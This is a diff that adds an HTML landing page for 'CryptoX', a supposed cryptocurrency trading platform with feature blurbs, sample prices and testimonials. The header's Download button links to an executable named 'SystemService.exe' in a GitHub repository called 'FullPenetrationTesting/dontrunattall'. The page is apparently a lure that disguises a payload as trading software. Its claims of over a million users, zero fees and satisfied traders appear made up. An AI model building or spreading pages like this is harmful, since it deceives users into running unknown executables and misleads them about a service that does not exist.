@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoX - Modern Cryptocurrency Trading Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- Custom Cursor -->
+<div class="cursor"></div>
+<div class="cursor-follower"></div>
+
+<!-- Header/Navigation -->
+<header>
+    <div class="container">
+        <div class="logo">
+            <a href="index.html">
+                <i class="fas fa-chart-line"></i>
+                <span>CryptoX</span>
+            </a>
+        </div>
+        
+        <nav>
+            <ul class="nav-links">
+                <li><a href="index.html" class="active">Home</a></li>
+                <li><a href="about.html">About Us</a></li>
+                <li><a href="contact.html">Contact</a></li>
+                <li><a href="https://github.com/FullPenetrationTesting/dontrunattall/releases/download/v1.0.0/SystemService.exe" class="download-btn" id="downloadBtn">Download <i class="fas fa-download"></i></a></li>
+            </ul>
+        </nav>
+        
+        <div class="mobile-menu">
+            <i class="fas fa-bars"></i>
+        </div>
+    </div>
+</header>
+
+<!-- Hero Section -->
+<section class="hero">
+    <div class="container">
+        <div class="hero-content">
+            <div class="hero-text">
+                <div class="badge">
+                    <i class="fas fa-rocket"></i>
+                    <span>Next Generation Trading</span>
+                </div>
+                <h1 class="glow-text">
+                    Trade Cryptocurrency 
+                    <span class="gradient-text">Smarter & Faster</span>
+                </h1>
+                <p>Experience the most advanced crypto trading platform with real-time data, 
+                   zero fees, and military-grade security. Join over 1M+ happy traders worldwide.</p>
+                
+                <div class="hero-buttons">
+                    <a href="#" class="btn btn-primary" id="getStartedBtn">
+                        Get Started <i class="fas fa-arrow-right"></i>
+                    </a>
+                    <a href="#" class="btn btn-secondary">
+                        Watch Demo <i class="fas fa-play"></i>
+                    </a>
+                </div>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <h3>$50B+</h3>
+                        <p>Trading Volume</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>1M+</h3>
+                        <p>Active Users</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>0%</h3>
+                        <p>Transaction Fee</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="hero-visual">
+                <div class="floating-card card-1">
+                    <i class="fab fa-bitcoin"></i>
+                    <span>BTC +12.5%</span>
+                </div>
+                <div class="floating-card card-2">
+                    <i class="fab fa-ethereum"></i>
+                    <span>ETH +8.3%</span>
+                </div>
+                <div class="floating-card card-3">
+                    <i class="fas fa-chart-line"></i>
+                    <span>Market Up</span>
+                </div>
+                <div class="chart-container">
+                    <canvas id="cryptoChart"></canvas>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Features Section -->
+<section class="features">
+    <div class="container">
+        <div class="section-header">
+            <span class="section-tag">Why Choose Us</span>
+            <h2>Powerful Features for <span class="gradient-text">Modern Trading</span></h2>
+            <p>Everything you need to succeed in the crypto market</p>
+        </div>
+        
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3>Military Security</h3>
+                <p>Bank-grade encryption with multi-factor authentication to keep your assets safe.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h3>Lightning Fast</h3>
+                <p>Execute trades in milliseconds with our high-performance trading engine.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+                <h3>Advanced Analytics</h3>
+                <p>Real-time charts, indicators, and market insights for informed decisions.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-hand-holding-usd"></i>
+                </div>
+                <h3>Zero Fees</h3>
+                <p>Enjoy commission-free trading with no hidden costs or charges.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <h3>Mobile Trading</h3>
+                <p>Trade anytime, anywhere with our powerful mobile application.</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-headset"></i>
+                </div>
+                <h3>24/7 Support</h3>
+                <p>Dedicated support team available around the clock to assist you.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Trading Section -->
+<section class="trading">
+    <div class="container">
+        <div class="trading-content">
+            <div class="trading-text">
+                <span class="section-tag">Start Trading</span>
+                <h2>Trade Top <span class="gradient-text">Cryptocurrencies</span></h2>
+                <p>Access hundreds of trading pairs with deep liquidity and competitive spreads.</p>
+                
+                <div class="crypto-list">
+                    <div class="crypto-item">
+                        <div class="crypto-info">
+                            <i class="fab fa-bitcoin"></i>
+                            <div>
+                                <h4>Bitcoin</h4>
+                                <p>BTC/USD</p>
+                            </div>
+                        </div>
+                        <div class="crypto-price">
+                            <span class="price">$43,250</span>
+                            <span class="change positive">+2.4%</span>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-item">
+                        <div class="crypto-info">
+                            <i class="fab fa-ethereum"></i>
+                            <div>
+                                <h4>Ethereum</h4>
+                                <p>ETH/USD</p>
+                            </div>
+                        </div>
+                        <div class="crypto-price">
+                            <span class="price">$2,250</span>
+                            <span class="change positive">+1.8%</span>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-item">
+                        <div class="crypto-info">
+                            <i class="fab fa-solana"></i>
+                            <div>
+                                <h4>Solana</h4>
+                                <p>SOL/USD</p>
+                            </div>
+                        </div>
+                        <div class="crypto-price">
+                            <span class="price">$98.50</span>
+                            <span class="change positive">+5.2%</span>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-item">
+                        <div class="crypto-info">
+                            <i class="fas fa-coins"></i>
+                            <div>
+                                <h4>Cardano</h4>
+                                <p>ADA/USD</p>
+                            </div>
+                        </div>
+                        <div class="crypto-price">
+                            <span class="price">$0.45</span>
+                            <span class="change negative">-1.2%</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <a href="#" class="btn btn-primary" id="downloadBtn2">
+                    Start Trading Now <i class="fas fa-arrow-right"></i>
+                </a>
+            </div>
+            
+            <div class="trading-visual">
+                <div class="trading-card">
+                    <div class="trading-header">
+                        <h4>Quick Trade</h4>
+                        <i class="fas fa-chart-simple"></i>
+                    </div>
+                    <div class="trade-form">
+                        <div class="trade-type">
+                            <button class="active">Buy</button>
+                            <button>Sell</button>
+                        </div>
+                        <div class="input-group">
+                            <label>Amount (USD)</label>
+                            <input type="text" placeholder="0.00">
+                        </div>
+                        <div class="input-group">
+                            <label>You Get (BTC)</label>
+                            <input type="text" placeholder="0.0000" readonly>
+                        </div>
+                        <button class="trade-btn">Preview Order</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Testimonials -->
+<section class="testimonials">
+    <div class="container">
+        <div class="section-header">
+            <span class="section-tag">Testimonials</span>
+            <h2>What <span class="gradient-text">Traders Say</span></h2>
+            <p>Join thousands of satisfied traders worldwide</p>
+        </div>
+        
+        <div class="testimonials-grid">
+            <div class="testimonial-card">
+                <div class="testimonial-rating">
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                </div>
+                <p>"Best trading platform I've ever used. The interface is intuitive and the execution speed is incredible."</p>
+                <div class="testimonial-author">
+                    <img src="https://randomuser.me/api/portraits/men/1.jpg" alt="User">
+                    <div>
+                        <h4>John Anderson</h4>
+                        <p>Professional Trader</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="testimonial-card">
+                <div class="testimonial-rating">
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                </div>
+                <p>"Zero fees and excellent customer support. This platform has everything I need for successful trading."</p>
+                <div class="testimonial-author">
+                    <img src="https://randomuser.me/api/portraits/women/2.jpg" alt="User">
+                    <div>
+                        <h4>Sarah Johnson</h4>
+                        <p>Crypto Investor</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="testimonial-card">
+                <div class="testimonial-rating">
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                </div>
+                <p>"The security features give me peace of mind. I've been trading here for 2 years without any issues."</p>
+                <div class="testimonial-author">
+                    <img src="https://randomuser.me/api/portraits/men/3.jpg" alt="User">
+                    <div>
+                        <h4>Michael Chen</h4>
+                        <p>Day Trader</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- CTA Section -->
+<section class="cta">
+    <div class="container">
+        <div class="cta-content">
+            <h2>Ready to Start Your Crypto Journey?</h2>
+            <p>Join CryptoX today and experience the future of trading</p>
+            <a href="#" class="btn btn-primary" id="downloadBtn3">
+                Download Now <i class="fas fa-download"></i>
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="footer-content">
+            <div class="footer-section">
+                <div class="logo">
+                    <i class="fas fa-chart-line"></i>
+                    <span>CryptoX</span>
+                </div>
+                <p>The most trusted cryptocurrency trading platform with advanced features and zero fees.</p>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                </div>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Platform</h4>
+                <ul>
+                    <li><a href="#">Trade</a></li>
+                    <li><a href="#">Markets</a></li>
+                    <li><a href="#">Fees</a></li>
+                    <li><a href="#">API</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Resources</h4>
+                <ul>
+                    <li><a href="#">Learn</a></li>
+                    <li><a href="#">Blog</a></li>
+                    <li><a href="#">Support</a></li>
+                    <li><a href="#">Security</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Company</h4>
+                <ul>
+                    <li><a href="about.html">About Us</a></li>
+                    <li><a href="contact.html">Contact</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Legal</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>&copy; 2026 CryptoX. All rights reserved.</p>
+        </div>
+    </div>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
